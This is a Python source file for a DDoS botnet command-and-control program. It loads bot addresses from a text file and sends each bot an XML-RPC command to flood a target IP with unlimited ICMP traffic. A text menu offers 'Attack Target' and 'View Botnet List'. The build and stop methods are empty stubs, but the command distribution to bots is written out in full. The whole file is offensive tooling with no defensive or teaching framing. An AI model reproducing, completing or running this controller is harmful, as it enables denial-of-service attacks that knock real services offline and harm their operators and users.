"""
message_format = {
    "type": "attack", # "attack" or "stop"
    "target_ip": "0.0.0.0",
    "attack_type": "icmp",
    "number_of_attack": -1 # -1 for unlimited attack
}
"""

import xmlrpc.client
import os


class DDoSMaster:
    def __init__(self):
        self.botnets = self.getBotNetList()
        self.message = {
            "type": "attack",  # "attack" or "stop"
            "target_ip": "192.168.1.1",
            "attack_type": "icmp",
            "number_of_attack": -1
        }

    def distributeCommand(self, message):
        """distributing command that has been build to botnet"""
        print(self.botnets)
        for bot in self.botnets:
            print(bot)
            s = xmlrpc.client.ServerProxy("http://"+bot+":5000")
            print(s.system.listMethods())
            s.give_command(message)

    def buildAttack(self, target_ip, attack_type, number_of_attack):
        """prepare the message attack that will send to botnet"""
        pass

    def stopAttack(self):
        """stop attack to the target server"""
        pass

    def getBotNetList(self):
        """view all list of available botnet"""
        ip_list = []
        with open("botnet_list.txt", "r") as file:
            ip_list = file.readlines()
            ip_list = [x.strip() for x in ip_list]
        return ip_list

    def parseMenu(self, menu):
        if menu == "1":
            print("!")
            self.distributeCommand(self.message)
        elif menu == "2":
            self.botnets = self.getBotNetList()
            print("*** BotNet List ***")
            print(self.botnets)


if __name__ == '__main__':
    ddos = DDoSMaster()
    menu = 0
    while menu != 99:
        print("========== Welcome to DDoS Attack Application! ==========")
        ddos.parseMenu(menu)
        print("1. Attack Target")
        print("2. View Botnet List")
        print("Select: ", end="")
        menu = str(input())
        os.system("cls")
